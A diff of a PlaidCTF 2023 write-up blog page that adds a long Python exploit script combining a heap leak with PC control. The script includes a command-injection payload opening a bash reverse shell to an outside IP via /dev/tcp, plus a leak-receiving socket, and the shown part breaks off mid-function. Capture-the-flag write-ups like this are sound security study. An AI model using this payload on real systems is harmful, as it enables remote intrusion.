@@ -9,7 +9,7 @@
 <meta property="og:type" content="article" />
 <meta property="og:url" content="https://chovid99.github.io/posts/plaidctf-2023/" /><meta property="og:image" content="https://chovid99.github.io/C99-web-card.png"/><meta property="article:section" content="posts" />
 <meta property="article:published_time" content="2023-04-17T04:00:36+07:00" />
-<meta property="article:modified_time" content="2023-04-17T04:00:36+07:00" /><meta property="og:site_name" content="Welcome to Chovid99&#39;s Blog" />
+<meta property="article:modified_time" content="2023-04-17T17:02:04+07:00" /><meta property="og:site_name" content="Welcome to Chovid99&#39;s Blog" />
 <meta name="twitter:card" content="summary_large_image"/>
 <meta name="twitter:image" content="https://chovid99.github.io/C99-web-card.png"/>
 
@@ -29,8 +29,8 @@
         "mainEntityOfPage": {
             "@type": "WebPage",
             "@id": "https:\/\/chovid99.github.io\/posts\/plaidctf-2023\/"
-        },"image": ["https:\/\/chovid99.github.io\/C99-web-card.png"],"genre": "posts","keywords": "Writeup, PlaidCTF, pwn, web, heap, postgresql, collation","wordcount":  6956 ,
-        "url": "https:\/\/chovid99.github.io\/posts\/plaidctf-2023\/","datePublished": "2023-04-17T04:00:36+07:00","dateModified": "2023-04-17T04:00:36+07:00","publisher": {
+        },"image": ["https:\/\/chovid99.github.io\/C99-web-card.png"],"genre": "posts","keywords": "Writeup, PlaidCTF, pwn, web, heap, postgresql, collation","wordcount":  7989 ,
+        "url": "https:\/\/chovid99.github.io\/posts\/plaidctf-2023\/","datePublished": "2023-04-17T04:00:36+07:00","dateModified": "2023-04-17T17:02:04+07:00","publisher": {
             "@type": "Organization",
             "name": "Chovid99","logo": "https:\/\/chovid99.github.io\/C99-Black3.png"},"author": {
                 "@type": "Person",
@@ -76,8 +76,8 @@
         </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Plaid CTF 2023</h1><div class="post-meta">
             <div class="post-meta-line">
                 </div>
-            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="Apr 17, 2023">Apr 17, 2023</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;6956 words&nbsp;
-                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;33 minutes&nbsp;</div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="Apr 17, 2023">Apr 17, 2023</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;7989 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;38 minutes&nbsp;</div>
         </div><div class="details toc" id="toc-static"  data-kept="">
                 <div class="details-summary toc-title">
                     <span>Contents</span>
@@ -2400,6 +2400,519 @@
 </span></span><span class="line"><span class="cl">        <span class="n">s</span><span class="o">.</span><span class="n">watch</span><span class="p">(</span><span class="n">M</span><span class="p">,</span> <span class="s2">&#34;http://127.0.0.1/&#34;</span> <span class="o">+</span> <span class="n">RANDOMISH_STRING_FOR_M</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="mh">0x4141414100000000</span> <span class="o">+</span> <span class="n">i</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">tqdm</span><span class="o">.</span><span class="n">trange</span><span class="p">(</span><span class="mi">1000</span><span class="p">):</span>
 </span></span><span class="line"><span class="cl">        <span class="n">s</span><span class="o">.</span><span class="n">watch</span><span class="p">(</span><span class="n">FLOWER</span><span class="p">,</span> <span class="s2">&#34;http://127.0.0.2/&#34;</span> <span class="o">+</span> <span class="n">RANDOMISH_STRING_FOR_FLOWER</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="n">SECRET_FOR_FLOW</span><span class="p">[</span><span class="n">i</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># Wait for auto vacuum</span>
+</span></span><span class="line"><span class="cl">    <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">60</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">s</span><span class="o">.</span><span class="n">notify</span><span class="p">(</span><span class="n">FLOWER</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">main</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Below is the full script to automate all the process which combined both the leak and PC control POCs (Thanks to Riatre):</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">  1
+</span><span class="lnt">  2
+</span><span class="lnt">  3
+</span><span class="lnt">  4
+</span><span class="lnt">  5
+</span><span class="lnt">  6
+</span><span class="lnt">  7
+</span><span class="lnt">  8
+</span><span class="lnt">  9
+</span><span class="lnt"> 10
+</span><span class="lnt"> 11
+</span><span class="lnt"> 12
+</span><span class="lnt"> 13
+</span><span class="lnt"> 14
+</span><span class="lnt"> 15
+</span><span class="lnt"> 16
+</span><span class="lnt"> 17
+</span><span class="lnt"> 18
+</span><span class="lnt"> 19
+</span><span class="lnt"> 20
+</span><span class="lnt"> 21
+</span><span class="lnt"> 22
+</span><span class="lnt"> 23
+</span><span class="lnt"> 24
+</span><span class="lnt"> 25
+</span><span class="lnt"> 26
+</span><span class="lnt"> 27
+</span><span class="lnt"> 28
+</span><span class="lnt"> 29
+</span><span class="lnt"> 30
+</span><span class="lnt"> 31
+</span><span class="lnt"> 32
+</span><span class="lnt"> 33
+</span><span class="lnt"> 34
+</span><span class="lnt"> 35
+</span><span class="lnt"> 36
+</span><span class="lnt"> 37
+</span><span class="lnt"> 38
+</span><span class="lnt"> 39
+</span><span class="lnt"> 40
+</span><span class="lnt"> 41
+</span><span class="lnt"> 42
+</span><span class="lnt"> 43
+</span><span class="lnt"> 44
+</span><span class="lnt"> 45
+</span><span class="lnt"> 46
+</span><span class="lnt"> 47
+</span><span class="lnt"> 48
+</span><span class="lnt"> 49
+</span><span class="lnt"> 50
+</span><span class="lnt"> 51
+</span><span class="lnt"> 52
+</span><span class="lnt"> 53
+</span><span class="lnt"> 54
+</span><span class="lnt"> 55
+</span><span class="lnt"> 56
+</span><span class="lnt"> 57
+</span><span class="lnt"> 58
+</span><span class="lnt"> 59
+</span><span class="lnt"> 60
+</span><span class="lnt"> 61
+</span><span class="lnt"> 62
+</span><span class="lnt"> 63
+</span><span class="lnt"> 64
+</span><span class="lnt"> 65
+</span><span class="lnt"> 66
+</span><span class="lnt"> 67
+</span><span class="lnt"> 68
+</span><span class="lnt"> 69
+</span><span class="lnt"> 70
+</span><span class="lnt"> 71
+</span><span class="lnt"> 72
+</span><span class="lnt"> 73
+</span><span class="lnt"> 74
+</span><span class="lnt"> 75
+</span><span class="lnt"> 76
+</span><span class="lnt"> 77
+</span><span class="lnt"> 78
+</span><span class="lnt"> 79
+</span><span class="lnt"> 80
+</span><span class="lnt"> 81
+</span><span class="lnt"> 82
+</span><span class="lnt"> 83
+</span><span class="lnt"> 84
+</span><span class="lnt"> 85
+</span><span class="lnt"> 86
+</span><span class="lnt"> 87
+</span><span class="lnt"> 88
+</span><span class="lnt"> 89
+</span><span class="lnt"> 90
+</span><span class="lnt"> 91
+</span><span class="lnt"> 92
+</span><span class="lnt"> 93
+</span><span class="lnt"> 94
+</span><span class="lnt"> 95
+</span><span class="lnt"> 96
+</span><span class="lnt"> 97
+</span><span class="lnt"> 98
+</span><span class="lnt"> 99
+</span><span class="lnt">100
+</span><span class="lnt">101
+</span><span class="lnt">102
+</span><span class="lnt">103
+</span><span class="lnt">104
+</span><span class="lnt">105
+</span><span class="lnt">106
+</span><span class="lnt">107
+</span><span class="lnt">108
+</span><span class="lnt">109
+</span><span class="lnt">110
+</span><span class="lnt">111
+</span><span class="lnt">112
+</span><span class="lnt">113
+</span><span class="lnt">114
+</span><span class="lnt">115
+</span><span class="lnt">116
+</span><span class="lnt">117
+</span><span class="lnt">118
+</span><span class="lnt">119
+</span><span class="lnt">120
+</span><span class="lnt">121
+</span><span class="lnt">122
+</span><span class="lnt">123
+</span><span class="lnt">124
+</span><span class="lnt">125
+</span><span class="lnt">126
+</span><span class="lnt">127
+</span><span class="lnt">128
+</span><span class="lnt">129
+</span><span class="lnt">130
+</span><span class="lnt">131
+</span><span class="lnt">132
+</span><span class="lnt">133
+</span><span class="lnt">134
+</span><span class="lnt">135
+</span><span class="lnt">136
+</span><span class="lnt">137
+</span><span class="lnt">138
+</span><span class="lnt">139
+</span><span class="lnt">140
+</span><span class="lnt">141
+</span><span class="lnt">142
+</span><span class="lnt">143
+</span><span class="lnt">144
+</span><span class="lnt">145
+</span><span class="lnt">146
+</span><span class="lnt">147
+</span><span class="lnt">148
+</span><span class="lnt">149
+</span><span class="lnt">150
+</span><span class="lnt">151
+</span><span class="lnt">152
+</span><span class="lnt">153
+</span><span class="lnt">154
+</span><span class="lnt">155
+</span><span class="lnt">156
+</span><span class="lnt">157
+</span><span class="lnt">158
+</span><span class="lnt">159
+</span><span class="lnt">160
+</span><span class="lnt">161
+</span><span class="lnt">162
+</span><span class="lnt">163
+</span><span class="lnt">164
+</span><span class="lnt">165
+</span><span class="lnt">166
+</span><span class="lnt">167
+</span><span class="lnt">168
+</span><span class="lnt">169
+</span><span class="lnt">170
+</span><span class="lnt">171
+</span><span class="lnt">172
+</span><span class="lnt">173
+</span><span class="lnt">174
+</span><span class="lnt">175
+</span><span class="lnt">176
+</span><span class="lnt">177
+</span><span class="lnt">178
+</span><span class="lnt">179
+</span><span class="lnt">180
+</span><span class="lnt">181
+</span><span class="lnt">182
+</span><span class="lnt">183
+</span><span class="lnt">184
+</span><span class="lnt">185
+</span><span class="lnt">186
+</span><span class="lnt">187
+</span><span class="lnt">188
+</span><span class="lnt">189
+</span><span class="lnt">190
+</span><span class="lnt">191
+</span><span class="lnt">192
+</span><span class="lnt">193
+</span><span class="lnt">194
+</span><span class="lnt">195
+</span><span class="lnt">196
+</span><span class="lnt">197
+</span><span class="lnt">198
+</span><span class="lnt">199
+</span><span class="lnt">200
+</span><span class="lnt">201
+</span><span class="lnt">202
+</span><span class="lnt">203
+</span><span class="lnt">204
+</span><span class="lnt">205
+</span><span class="lnt">206
+</span><span class="lnt">207
+</span><span class="lnt">208
+</span><span class="lnt">209
+</span><span class="lnt">210
+</span><span class="lnt">211
+</span><span class="lnt">212
+</span><span class="lnt">213
+</span><span class="lnt">214
+</span><span class="lnt">215
+</span><span class="lnt">216
+</span><span class="lnt">217
+</span><span class="lnt">218
+</span><span class="lnt">219
+</span><span class="lnt">220
+</span><span class="lnt">221
+</span><span class="lnt">222
+</span><span class="lnt">223
+</span><span class="lnt">224
+</span><span class="lnt">225
+</span><span class="lnt">226
+</span><span class="lnt">227
+</span><span class="lnt">228
+</span><span class="lnt">229
+</span><span class="lnt">230
+</span><span class="lnt">231
+</span><span class="lnt">232
+</span><span class="lnt">233
+</span><span class="lnt">234
+</span><span class="lnt">235
+</span><span class="lnt">236
+</span><span class="lnt">237
+</span><span class="lnt">238
+</span><span class="lnt">239
+</span><span class="lnt">240
+</span><span class="lnt">241
+</span><span class="lnt">242
+</span><span class="lnt">243
+</span><span class="lnt">244
+</span><span class="lnt">245
+</span><span class="lnt">246
+</span><span class="lnt">247
+</span><span class="lnt">248
+</span><span class="lnt">249
+</span><span class="lnt">250
+</span><span class="lnt">251
+</span><span class="lnt">252
+</span><span class="lnt">253
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">typing</span> <span class="kn">import</span> <span class="n">Any</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">logging</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">tqdm</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">random</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">string</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">socket</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">threading</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">struct</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># SERVER_URL = &#34;http://3.113.243.230:3000&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">SERVER_URL</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">rstrip</span><span class="p">(</span><span class="s2">&#34;/&#34;</span><span class="p">)</span> <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">1</span> <span class="k">else</span> <span class="s2">&#34;http://127.0.0.1:3000&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">HEAP_OFF</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span> <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">2</span> <span class="k">else</span> <span class="mh">0x6000</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># PINGBACK_URL = &#34;http://35.72.245.211:4&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># PINGBACK_URL = &#34;http://3.113.243.230:4&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">PINGBACK_URL</span> <span class="o">=</span> <span class="s2">&#34;http://54.90.103.135:5&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">COMMAND</span> <span class="o">=</span> <span class="s1">&#39; ; bash -c &#34;bash -i &gt;&amp; /dev/tcp/35.72.245.211/6666 0&gt;&amp;1&#34;; dy78912yh3&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">logger</span> <span class="o">=</span> <span class="n">logging</span><span class="o">.</span><span class="n">getLogger</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># logging.basicConfig(level=logging.DEBUG)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># import http.client</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># httpclient_logger = logging.getLogger(&#34;http.client&#34;)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># def httpclient_logging_patch(level=logging.DEBUG):</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#     &#34;&#34;&#34;Enable HTTPConnection debug logging to the logging framework&#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#     def httpclient_log(*args):</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#         httpclient_logger.log(level, &#34; &#34;.join(args))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#     # mask the print() built-in in the http.client module to use</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#     # logging instead</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#     http.client.print = httpclient_log</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#     # enable debugging</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#     http.client.HTTPConnection.debuglevel = 1</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># httpclient_logging_patch()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">url_for</span><span class="p">(</span><span class="n">path</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">SERVER_URL</span> <span class="o">+</span> <span class="n">path</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">User</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">session</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">login</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">r</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">            <span class="n">url_for</span><span class="p">(</span><span class="s2">&#34;/_m/2e7970cbec/loggingIn&#34;</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">            <span class="n">data</span><span class="o">=</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="s2">&#34;redirectTo&#34;</span><span class="p">:</span> <span class="s2">&#34;/&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                <span class="s2">&#34;username&#34;</span><span class="p">:</span> <span class="n">username</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                <span class="s2">&#34;password&#34;</span><span class="p">:</span> <span class="n">password</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="p">},</span>
+</span></span><span class="line"><span class="cl">            <span class="n">allow_redirects</span><span class="o">=</span><span class="kc">False</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">assert</span> <span class="n">r</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">302</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">watch</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">kind</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">url</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">secret</span><span class="p">:</span> <span class="nb">int</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">int</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">assert</span> <span class="mi">0</span> <span class="o">&lt;=</span> <span class="n">secret</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="o">**</span><span class="mi">64</span>
+</span></span><span class="line"><span class="cl">        <span class="n">r</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">            <span class="n">url_for</span><span class="p">(</span><span class="s2">&#34;/_m/34a106c003/transacting&#34;</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">            <span class="n">files</span><span class="o">=</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="s2">&#34;action&#34;</span><span class="p">:</span> <span class="p">(</span><span class="kc">None</span><span class="p">,</span> <span class="s2">&#34;watch&#34;</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">                <span class="s2">&#34;kind&#34;</span><span class="p">:</span> <span class="p">(</span><span class="kc">None</span><span class="p">,</span> <span class="n">kind</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">                <span class="s2">&#34;url&#34;</span><span class="p">:</span> <span class="p">(</span><span class="kc">None</span><span class="p">,</span> <span class="n">url</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">                <span class="s2">&#34;secret&#34;</span><span class="p">:</span> <span class="p">(</span><span class="kc">None</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">secret</span><span class="p">)),</span>
+</span></span><span class="line"><span class="cl">            <span class="p">},</span>
+</span></span><span class="line"><span class="cl">            <span class="n">allow_redirects</span><span class="o">=</span><span class="kc">False</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">r</span><span class="o">.</span><span class="n">status_code</span> <span class="ow">not</span> <span class="ow">in</span> <span class="p">(</span><span class="mi">204</span><span class="p">,</span> <span class="mi">302</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">            <span class="k">raise</span> <span class="ne">RuntimeError</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">r</span><span class="o">.</span><span class="n">status_code</span><span class="si">=}</span><span class="s2"> </span><span class="si">{</span><span class="n">r</span><span class="o">.</span><span class="n">content</span><span class="si">=}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">loc</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">headers</span><span class="p">[</span><span class="s2">&#34;Location&#34;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">        <span class="k">assert</span> <span class="n">loc</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="s2">&#34;/?watchId=&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nb">int</span><span class="p">(</span><span class="n">loc</span><span class="p">[</span><span class="nb">len</span><span class="p">(</span><span class="s2">&#34;/?watchId=&#34;</span><span class="p">)</span> <span class="p">:])</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">unwatch</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">kind</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">watch_id</span><span class="p">:</span> <span class="nb">int</span> <span class="o">|</span> <span class="kc">None</span> <span class="o">=</span> <span class="kc">None</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">bool</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="s2">&#34;action&#34;</span><span class="p">:</span> <span class="p">(</span><span class="kc">None</span><span class="p">,</span> <span class="s2">&#34;unwatch&#34;</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">            <span class="s2">&#34;kind&#34;</span><span class="p">:</span> <span class="p">(</span><span class="kc">None</span><span class="p">,</span> <span class="n">kind</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">watch_id</span> <span class="ow">is</span> <span class="ow">not</span> <span class="kc">None</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">data</span><span class="p">[</span><span class="s2">&#34;id&#34;</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kc">None</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">watch_id</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">        <span class="n">r</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">            <span class="n">url_for</span><span class="p">(</span><span class="s2">&#34;/_m/34a106c003/transacting&#34;</span><span class="p">),</span> <span class="n">files</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">allow_redirects</span><span class="o">=</span><span class="kc">False</span>
+</span></span><span class="line"><span class="cl">        <span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">r</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">302</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">notify</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">kind</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">data</span><span class="p">:</span> <span class="nb">dict</span><span class="p">[</span><span class="nb">str</span><span class="p">,</span> <span class="n">Any</span><span class="p">]</span> <span class="o">=</span> <span class="p">{})</span> <span class="o">-&gt;</span> <span class="nb">bool</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">r</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">            <span class="n">url_for</span><span class="p">(</span><span class="s2">&#34;/_m/34a106c003/transacting&#34;</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">            <span class="n">files</span><span class="o">=</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="s2">&#34;action&#34;</span><span class="p">:</span> <span class="p">(</span><span class="kc">None</span><span class="p">,</span> <span class="s2">&#34;notify&#34;</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">                <span class="s2">&#34;kind&#34;</span><span class="p">:</span> <span class="p">(</span><span class="kc">None</span><span class="p">,</span> <span class="n">kind</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span> <span class="o">|</span> <span class="p">{</span><span class="n">k</span><span class="p">:</span> <span class="p">(</span><span class="kc">None</span><span class="p">,</span> <span class="n">v</span><span class="p">)</span> <span class="k">for</span> <span class="n">k</span><span class="p">,</span> <span class="n">v</span> <span class="ow">in</span> <span class="n">data</span><span class="o">.</span><span class="n">items</span><span class="p">()},</span>
+</span></span><span class="line"><span class="cl">            <span class="n">allow_redirects</span><span class="o">=</span><span class="kc">False</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">r</span><span class="o">.</span><span class="n">status_code</span> <span class="ow">not</span> <span class="ow">in</span> <span class="p">(</span><span class="mi">204</span><span class="p">,</span> <span class="mi">302</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">            <span class="n">logger</span><span class="o">.</span><span class="n">error</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;notify failed </span><span class="si">{</span><span class="n">r</span><span class="o">.</span><span class="n">status_code</span><span class="si">=}</span><span class="s2"> </span><span class="si">{</span><span class="n">r</span><span class="o">.</span><span class="n">content</span><span class="si">=}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">r</span><span class="o">.</span><span class="n">status_code</span> <span class="ow">in</span> <span class="p">(</span><span class="mi">204</span><span class="p">,</span> <span class="mi">302</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">leak_receiver</span><span class="p">(</span><span class="n">finish_ev</span><span class="p">,</span> <span class="n">result_dict</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">handle_client</span><span class="p">(</span><span class="n">conn</span><span class="p">,</span> <span class="n">addr</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">data</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">while</span> <span class="sa">b</span><span class="s2">&#34;kind=&#34;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">data</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">data</span> <span class="o">+=</span> <span class="n">conn</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;recv_data: </span><span class="si">{</span><span class="n">data</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="sa">b</span><span class="s2">&#34;kind=rum&#34;</span> <span class="ow">in</span> <span class="n">data</span> <span class="ow">or</span> <span class="sa">b</span><span class="s2">&#34;kind=anchor&#34;</span> <span class="ow">in</span> <span class="n">data</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">pos</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34; HTTP/1.1&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">addr</span><span class="p">,</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s2">&#34;&lt;Q&#34;</span><span class="p">,</span> <span class="n">data</span><span class="p">[</span><span class="n">pos</span><span class="o">-</span><span class="mi">6</span><span class="p">:</span><span class="n">pos</span><span class="p">]</span><span class="o">+</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00\x00</span><span class="s2">&#34;</span><span class="p">)</span>
